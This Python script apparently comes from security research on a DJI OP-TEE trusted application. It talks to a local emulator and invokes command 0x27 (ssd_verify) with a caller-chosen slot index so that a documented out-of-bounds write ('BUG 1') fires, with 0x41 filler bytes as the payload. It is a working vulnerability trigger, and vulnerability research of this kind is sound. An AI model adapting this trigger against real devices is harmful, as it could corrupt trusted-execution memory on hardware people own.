#!/usr/bin/env python3
"""Basic CA <-> taemu interaction for the DJI OP-TEE TA e91c9402.

The emulator, started in INTERACTIVE mode, binds a TCP server on 127.0.0.1:1337
and speaks a tiny framed protocol:  packet = bytes([func_id, length]) + payload.
Shared-memory buffers are passed via System V shared memory: the CA creates a
segment under a key, the emulator attaches to the same key, and an opaque
"buf" handle ties the registration to the invoke params.

This script:
  1. TEEC_InitializeContext
  2. TEEC_OpenSession (UUID e91c9402-64a0-470f-88e7-bf5d3c606b6a)
  3. TEEC_AllocateSharedMemory (0x6d bytes)
  4. TEEC_InvokeCommand cmd 0x27 (ssd_verify), param0 = MEMREF_INPUT(buf, 0x6d)
  5. TEEC_CloseSession / TEEC_FinalizeContext

cmd 0x27 reads a 16-bit slot index from buffer[1:3] and (on the unauthenticated
RPMB-miss path) writes the 0x6d CA bytes into ssd_info_ptr_array[idx] with no
bounds check (writeup BUG 1). Pass an out-of-range idx to drive the OOB write
and watch the emulator's ASAN-instrumented memcpy flag it.

Usage:
    python3 interact_e91c9402.py [idx]      # default idx=0 (in-bounds, clean)
"""
import socket
import struct
import sys
import time
from ctypes import CDLL, c_int, c_size_t, c_void_p, memmove

HOST, PORT = "127.0.0.1", 1337

# func ids (match emulate.ta_mgr.FUNCS)
F_INIT, F_OPEN, F_INVOKE, F_CLOSE = 0, 1, 2, 3
F_REGISTER_SHM, F_RELEASE_SHM, F_FINALIZE, F_ALLOC_SHM = 4, 5, 6, 7

# GP TEE_PARAM_TYPE_* values
PT_NONE = 0
PT_VALUE_INPUT, PT_VALUE_OUTPUT, PT_VALUE_INOUT = 1, 2, 3
PT_MEMREF_INPUT, PT_MEMREF_OUTPUT, PT_MEMREF_INOUT = 5, 6, 7

UUID = "e91c9402-64a0-470f-88e7-bf5d3c606b6a"

IPC_CREAT = 0o1000
SHM_KEY = 0x1337
SHM_BUF_HANDLE = 0xDEAD0000  # opaque CA-chosen handle for this buffer

libc = CDLL("libc.so.6", use_errno=True)
libc.shmget.restype, libc.shmget.argtypes = c_int, (c_int, c_size_t, c_int)
libc.shmat.restype, libc.shmat.argtypes = c_void_p, (c_int, c_void_p, c_int)
libc.shmdt.restype, libc.shmdt.argtypes = c_int, (c_void_p,)


def uuid_to_bytes(u: str) -> bytes:
    """Pack a UUID into the TEEC_UUID binary layout the emulator expects."""
    a, b, c, d = u.split("-", 3)
    node = bytes.fromhex(d.replace("-", ""))
    return struct.pack("<I", int(a, 16)) + struct.pack("<H", int(b, 16)) + \
        struct.pack("<H", int(c, 16)) + node


class SharedMem:
    """A System V shared segment the emulator can attach to via its key."""

    def __init__(self, key: int, size: int):
        self.key, self.size = key, size
        self.shmid = libc.shmget(key, size, IPC_CREAT | 0o666)
        if self.shmid < 0:
            raise OSError("shmget failed")
        self.ptr = libc.shmat(self.shmid, None, 0)
        if self.ptr in (0, -1, c_void_p(-1).value):
            raise OSError("shmat failed")

    def write(self, data: bytes):
        assert len(data) <= self.size
        memmove(self.ptr, data, len(data))

    def detach(self):
        libc.shmdt(self.ptr)


class CA:
    def __init__(self, connect_retries: int = 60):
        # A refused connect (emulator not yet bound) consumes nothing, so we
        # simply retry until its accept() socket is up; the first successful
        # connect is THE interactive session.
        for _ in range(connect_retries):
            try:
                self.sock = socket.create_connection((HOST, PORT), timeout=5)
                return
            except (ConnectionRefusedError, OSError):
                time.sleep(1)
        raise RuntimeError(f"could not connect to emulator at {HOST}:{PORT}")

    def _txn(self, func: int, payload: bytes, expect_reply=True) -> bytes:
        assert len(payload) < 256
        self.sock.sendall(bytes([func, len(payload)]) + payload)
        if not expect_reply:
            return b""
        resp = self.sock.recv(1024)
        if not resp.startswith(b"ok"):
            raise RuntimeError(f"emulator rejected func {func}: {resp!r}")
        return resp[2:]

    def initialize(self):
        self._txn(F_INIT, b"start")
        print("[CA] context initialized")

    def open_session(self) -> int:
        sid = struct.unpack("<I", self._txn(F_OPEN, uuid_to_bytes(UUID)))[0]
        print(f"[CA] session opened: sid={sid}")
        return sid

    def alloc_shm(self, size: int, handle: int, key: int) -> SharedMem:
        shm = SharedMem(key, size)
        self._txn(F_ALLOC_SHM, struct.pack("<IIQ", key, size, handle))
        print(f"[CA] shared memory: key={key:#x} handle={handle:#x} size={size:#x}")
        return shm

    @staticmethod
    def _pack_params(params) -> bytes:
        """params: list of 4 tuples ('none'|'value'|'memref', ...)."""
        ptypes, blob = 0, b""
        for i, p in enumerate(params):
            kind = p[0]
            if kind == "none":
                ptypes |= PT_NONE << (4 * i)
                blob += b"\x00" * 24
            elif kind == "value":
                _, t, a, b = p
                ptypes |= t << (4 * i)
                blob += struct.pack("<II", a, b) + b"\x00" * 16
            elif kind == "memref":
                _, t, handle, size = p
                ptypes |= t << (4 * i)
                blob += struct.pack("<QQ", handle, size) + b"\x00" * 8
            else:
                raise ValueError(kind)
        return ptypes, blob

    def invoke(self, sid: int, cmd: int, params) -> int:
        ptypes, blob = self._pack_params(params)
        payload = struct.pack("<III", sid, cmd, ptypes) + blob
        ret = struct.unpack("<I", self._txn(F_INVOKE, payload))[0]
        print(f"[CA] invoke cmd={cmd:#x} ptypes={ptypes:#x} -> ret={ret:#010x}")
        return ret

    def close_session(self, sid: int):
        self._txn(F_CLOSE, struct.pack("<I", sid))
        print(f"[CA] session {sid} closed")

    def finalize(self):
        self._txn(F_FINALIZE, b"quit", expect_reply=False)
        print("[CA] context finalized")
        self.sock.close()


def main():
    idx = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0

    ca = CA()
    ca.initialize()
    sid = ca.open_session()

    # cmd 0x27 (ssd_verify) wants param0 = MEMREF_INPUT of size 0x6d.
    # buffer[0] = subcmd byte, buffer[1:3] = u16 slot index (BUG 1 sink).
    size = 0x6d
    shm = ca.alloc_shm(size, SHM_BUF_HANDLE, SHM_KEY)
    buf = bytearray(size)
    buf[0] = 0x00
    struct.pack_into("<H", buf, 1, idx & 0xFFFF)
    for i in range(3, size):
        buf[i] = 0x41  # 'A' filler — the bytes that get written into the slot
    shm.write(bytes(buf))
    print(f"[CA] ssd_verify slot index = {idx} (0x6d-byte payload, 0x41 filler)")

    params = [
        ("memref", PT_MEMREF_INPUT, SHM_BUF_HANDLE, size),
        ("none",),
        ("none",),
        ("none",),
    ]
    ca.invoke(sid, 0x27, params)

    ca.close_session(sid)
    ca.finalize()
    shm.detach()


if __name__ == "__main__":
    main()
